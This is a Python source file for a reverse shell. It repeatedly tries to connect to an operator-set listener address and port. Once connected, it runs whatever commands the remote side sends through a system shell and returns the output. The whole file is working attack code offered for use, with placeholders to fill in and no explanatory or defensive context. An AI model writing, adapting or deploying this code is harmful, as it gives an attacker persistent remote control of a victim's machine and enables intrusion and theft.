import socket
import subprocess
import time
import os

LHOST = '0.0.0.0' # CHANGE THIS
LPORT = 4545      # CHANGE THIS

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((LHOST, LPORT))
            s.send(b"[*] Connected to target\n")
            return s
        except socket.error:
            time.sleep(5)

def shell(s):
    while True:
        try:
            current_dir = os.getcwd()

            s.send(f"\n{current_dir} $ ".encode())

            command = s.recv(4096).decode().strip()

            if not command:
                continue

            output = command_exec(command)
            s.send(output)
        except Exception:
            break

def command_exec(command):
    try:
        if command.startswith("cd "):
            path = command[3:].strip()
            os.chdir(path)
            return b""
        else:
            return subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT
            ).communicate()[0]
    except Exception as e:
        return str(e).encode()

		
while True:
    conn = connect()
    shell(conn)
